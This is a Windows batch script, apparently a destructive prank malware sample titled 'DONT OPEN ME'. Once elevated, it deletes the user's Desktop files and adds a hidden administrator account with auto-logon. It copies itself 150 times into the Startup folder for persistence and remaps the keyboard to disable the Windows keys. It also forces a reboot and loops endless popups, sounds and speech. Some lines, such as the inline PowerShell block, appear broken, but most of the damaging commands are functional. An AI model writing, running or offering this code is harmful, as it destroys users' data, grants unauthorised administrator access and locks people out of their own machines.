@echo off

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

powershell -Command "[System.Windows.Forms.MessageBox]::Show('ALERT! DONT OPEN ME IS HERE. THIS SYSTEM IS NO LONGER YOURS! WARNING!', 'Critical Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)"

powershell -c (New-Object Media.SoundPlayer "C:\Windows\Media\Windows Critical Stop.wav").PlaySync()

start cmd /c echo WARNING: SYSTEM COMPROMISED && echo DONT OPEN ME IS HERE && pause && exit

net user "DONT OPEN ME" /add
net localgroup Administrateurs "DONT OPEN ME" /add

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d "DONT OPEN ME" /f

set desktop=%userprofile%\Desktop
del /f /q "%desktop%\*" >nul 2>&1
rmdir /s /q "%desktop%" >nul 2>&1

for /l %%i in (1,1,300) do (
    echo DONT OPEN ME IS HERE > "%desktop%\DONT_OPEN_ME_IS_HERE_%%i.txt"
)

set wallpaper=%userprofile%\Desktop\DONT_OPEN_ME_RED.bmp
powershell -Command "& {
    $Width = 1920; $Height = 1080;
    $bitmap = New-Object Drawing.Bitmap $Width, $Height;
    $graphics = [Drawing.Graphics]::FromImage($bitmap);
    $redBrush = New-Object Drawing.SolidBrush ([Drawing.Color]::FromArgb(255, 255, 0, 0));
    $whiteBrush = New-Object Drawing.SolidBrush ([Drawing.Color]::White);
    $font = New-Object Drawing.Font('Arial', 48, [Drawing.FontStyle]::Bold);
    $graphics.FillRectangle($redBrush, 0, 0, $Width, $Height);
    $graphics.DrawString('DONT OPEN ME IS HERE', $font, $whiteBrush, 200, 400);
    $bitmap.Save('%wallpaper%');
}"
reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaper%" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

set startup_folder=%userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
for /l %%i in (1,1,150) do (
    setlocal enabledelayedexpansion
    set random_name=!random!!random!
    copy "%~f0" "%startup_folder%\DONT_OPEN_ME_!random_name!.bat"
    endlocal
)

reg add "HKLM\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v Scancode Map /t REG_BINARY /d 00000000000000000400000000005be000005be000000000 /f

title DONT OPEN ME IS HERE

msg * "DONT OPEN ME HAS TAKEN OVER. THIS SYSTEM IS NO LONGER YOURS. WARNING!"
timeout /t 3 >nul

shutdown /r /f /t 15

for /l %%i in (1,1,150) do (
    start cmd /c echo DONT OPEN ME IS HERE && pause
)

:: Cette section tente de réactiver le service réseau
netsh interface set interface "Ethernet" enabled
netsh interface set interface "Wi-Fi" enabled

:loop
    powershell -c (New-Object Media.SoundPlayer "C:\Windows\Media\chimes.wav").PlaySync()
    set log_file=%desktop%\DONT_OPEN_ME_LOG_!random!.txt
    echo YOU CANNOT ESCAPE ME > %log_file%
    powershell -Command "[System.Windows.Forms.MessageBox]::Show('DONT OPEN ME IS HERE', 'Error', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)"
    start http://DONTOPENME
    powershell -c "(New-Object -ComObject SAPI.SpVoice).Speak('DONT OPEN ME IS HERE')"
    timeout /t 5 >nul
    goto loop
